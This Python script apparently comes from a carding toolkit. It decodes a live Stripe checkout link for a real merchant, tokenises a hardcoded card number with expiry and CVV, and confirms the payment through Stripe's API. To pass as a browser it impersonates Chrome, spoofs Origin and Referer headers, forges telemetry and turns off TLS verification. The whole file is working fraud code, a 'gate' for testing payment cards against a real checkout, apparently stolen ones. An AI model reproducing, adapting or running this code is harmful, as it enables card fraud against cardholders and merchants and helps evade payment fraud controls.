# -*- coding: utf-8 -*-
# POC: confirm через payment_pages/{cs}/confirm
import asyncio, os, sys, json, uuid
sys.stdout.reconfigure(encoding='utf-8')
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from curl_cffi.requests import AsyncSession
import stripe_fid
import gate_client as gc

URL = 'https://pay.opus.pro/c/pay/cs_live_b1Uf5qpxeXTGYCy6WQoQB5bmwsnvKAnqQR5rdLxU4U5GYLut0vTO96sqCz#fidnandhYHdWcXxpYCc%2FJ2FgY2RwaXEnKSdpamZkaWAnPydgaycpJ3ZwZ3Zmd2x1cWxqa1BrbHRwYGtgdnZAa2RnaWBhJz9jZGl2YCknYnBkZmRoamlgU2R3bGRrcSc%2FJ2Zqa3F3amknKSdkdWxOYHwnPyd1blppbHNgWjA0SH12UVJPcXM9S1BqQ3xMZnBGRkdif25HNXR%2FQlFOQkNuNG9AZkNVb1Q1PXBqTjcxNm8zQ01iaUt8a2ZhYEBTZ39Lb3Q1UXdLMG4yPVRDT1RzVU91Y25TNTVmN3ZfMkY2aycpJ2N3amhWYHdzYHcnP3F3cGApJ2dkZm5id2pwa2FGamlqdyc%2FJyZjY2NjY2MnKSdpZHxqcHFRfHVgJz8naHBpcWxabHFgaCcpJ2BrZGdpYFVpZGZgbWppYWB3dic%2FcXdwYHgl'
CARD = '4937241006643332|02|31|275'

async def main():
    d = stripe_fid.decode_fragment(URL)
    pk, cs = d['apiKey'], d['checkoutSessionId']
    async with AsyncSession(impersonate='chrome131', verify=False) as s:
        H = {'Origin': 'https://js.stripe.com', 'Referer': 'https://js.stripe.com/', 'Accept': 'application/json'}
        r = await s.get(f'https://api.stripe.com/v1/payment_pages/{cs}', params={'key': pk}, headers=H, timeout=12)
        data = r.json()
        checksum = data.get('init_checksum')
        print('init_checksum:', checksum)
        # токенизация
        telem = gc.stripe_telemetry('https://pay.opus.pro', pk)
        card = gc.parse_card(CARD)
        r2 = await s.post('https://api.stripe.com/v1/payment_methods', data=gc.tokenize_body(card, telem, 'https://pay.opus.pro'),
                          headers=gc.TOKENIZE_HEADERS, timeout=10)
        td = r2.json()
        if 'id' not in td:
            print('tokenize fail:', td); return
        pm = td['id']
        print('PM:', pm)
        # confirm через payment_pages
        body = {
            'key': pk,
            'eid': str(uuid.uuid4()),
            'payment_method': pm,
            'expected_payment_method_type': 'card',
            'expected_amount': str((data.get('payment_intent') or {}).get('amount') or 0),
            'return_url': 'https://pay.opus.pro/',
        }
        if checksum:
            body['init_checksum'] = checksum
        r3 = await s.post(f'https://api.stripe.com/v1/payment_pages/{cs}/confirm', data=body, headers=H, timeout=20)
        print('confirm:', r3.status_code)
        print(r3.text[:600])

asyncio.run(main())